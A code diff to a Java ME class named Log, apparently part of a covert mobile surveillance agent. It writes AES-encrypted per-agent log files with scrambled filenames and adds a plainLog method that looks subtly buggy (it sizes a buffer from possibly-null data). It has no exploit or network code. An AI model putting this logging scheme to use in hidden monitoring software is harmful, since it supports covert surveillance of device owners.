@@ -90,7 +90,7 @@ public final class Log {
     //#endif
 
     boolean firstSpace = true;
-    
+
     /**
      * Convert type log.
      * 
@@ -173,8 +173,28 @@ public final class Log {
         //#endif
     }
 
+    public Log(final boolean onSD, final byte[] aesKey) {
+        this();
+        //#ifdef DBC        
+        Check.requires(aesKey != null, "createLog: aesKey null");
+        Check.requires(encryption != null, "createLog: encryption null");
+        //#endif
+
+        //agent = agent_;
+        this.agentId = -1;
+        this.onSD = onSD;
+        this.aesKey = aesKey;
+
+        encryption.makeKey(aesKey);
+
+        //#ifdef DBC
+        //Check.ensures(agent != null, "createLog: agent null");
+        Check.ensures(encryption != null, "createLog: encryption null");
+        //#endif
+    }
+
     public Log(Log log) {
-        this(log.agentId,log.onSD,log.aesKey);
+        this(log.agentId, log.onSD, log.aesKey);
     }
 
     /**
@@ -212,7 +232,7 @@ public final class Log {
 
     public synchronized boolean createLog(final byte[] additionalData) {
         return createLog(additionalData, convertTypeLog(agentId));
-        
+
     }
 
     /**
@@ -232,7 +252,7 @@ public final class Log {
      */
     public synchronized boolean createLog(final byte[] additionalData,
             final int logType) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("createLog logType: " + logType);
         //#endif
 
@@ -242,7 +262,7 @@ public final class Log {
         //#endif
 
         timestamp = new Date();
-        
+
         int additionalLen = 0;
 
         if (additionalData != null) {
@@ -264,7 +284,7 @@ public final class Log {
         final boolean ret = Path.createDirectory(dir);
 
         if (!ret) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Dir not created: " + dir);
             //#endif
             return false;
@@ -278,11 +298,11 @@ public final class Log {
         Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
         //#endif
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("createLog fileName:" + fileName);
         //#endif
         try {
-            fconn = (FileConnection) Connector.open(fileName);
+            fconn = (FileConnection) Connector.open("file://" + fileName);
 
             if (fconn.exists()) {
                 close();
@@ -293,7 +313,7 @@ public final class Log {
                 return false;
             }
 
-            long available = fconn.availableSize();
+            final long available = fconn.availableSize();
             if (available < MIN_AVAILABLE_SIZE) {
                 close();
                 //#ifdef DEBUG
@@ -307,7 +327,7 @@ public final class Log {
                 return false;
             }
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Created: " + fileName);
             //#endif
 
@@ -337,7 +357,7 @@ public final class Log {
                     "Wrong filesize");
             //#endif
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("additionalData.length: " + plainBuffer.length);
             debug.trace("encBuffer.length: " + encBuffer.length);
             //#endif
@@ -348,6 +368,11 @@ public final class Log {
             //#endif
             return false;
         }
+        
+        //#ifdef DBC
+        Check.ensures(os != null,
+                "null os");
+        //#endif
 
         return true;
     }
@@ -448,10 +473,43 @@ public final class Log {
         return null;
     }
 
+    public synchronized byte[] plainLog(final byte[] additionalData,
+            final int logType, final byte[] data) {
+
+        //final byte[] encData = encryption.encryptData(data, 0);
+
+        int additionalLen = 0;
+
+        if (additionalData != null) {
+            additionalLen = additionalData.length;
+        }
+
+        final byte[] plainBuffer = makeDescription(additionalData, logType);
+        //#ifdef DBC
+        Check.asserts(plainBuffer.length >= 32 + additionalLen,
+                "Short plainBuffer");
+        //#endif
+        
+        // buffer completo
+        byte[] buffer = new byte[additionalData.length + data.length + 8];
+        DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length, false);
+        
+        // scriviamo la dimensione dell'header paddato
+        databuffer.writeInt(plainBuffer.length);
+        // scrittura dell'header cifrato
+        databuffer.write(additionalData);
+
+        // scrivo il contenuto
+        databuffer.writeInt(data.length);
+        databuffer.write(data);
+
+        return buffer;
+    }
+
     public boolean appendLog(final byte[] data) {
         return writeLog(data, 0);
     }
-    
+
     public boolean writeLog(final byte[] data) {
         return writeLog(data, 0);
     }
@@ -479,27 +537,27 @@ public final class Log {
             //#endif
             return false;
         }
-        
+
         //#ifdef DEBUG
         // green
         debug.ledStart(0x0044DC4C);
         //#endif
 
         final byte[] encData = encryption.encryptData(data, offset);
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("writeLog encdata: " + encData.length);
         //#endif
 
         try {
             os.write(Utils.intToByteArray(data.length - offset));
             os.write(encData);
-            os.flush();            
+            os.flush();
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Error writing file: " + e);
             //#endif
             return false;
-        }finally{
+        } finally {
             //#ifdef DEBUG
             debug.ledStop();
             //#endif
@@ -543,24 +601,24 @@ public final class Log {
             final byte[] token = (byte[]) bytelist.elementAt(i);
             databuffer.write(token);
         }
-        
-        //#ifdef DEBUG_TRACE
+
+        //#ifdef DEBUG
         debug.trace("len: " + buffer.length);
         //#endif
-        
+
         return writeLog(buffer);
     }
-    
+
     public static void info(final String message, final int priority) {
-        try{
-        Log logInfo = new Log(Agent.AGENT_INFO, false, Keys.getInstance()
-                    .getAesKey());
-        
-        logInfo.createLog(null);
-        logInfo.writeLog(message, true);
-        logInfo.close();
-        }catch(Exception ex){
-            //#ifdef DEBUG_ERROR
+        try {
+            final Log logInfo = new Log(Agent.AGENT_INFO, false, Keys
+                    .getInstance().getAesKey());
+
+            logInfo.createLog(null);
+            logInfo.writeLog(message, true);
+            logInfo.close();
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
         }
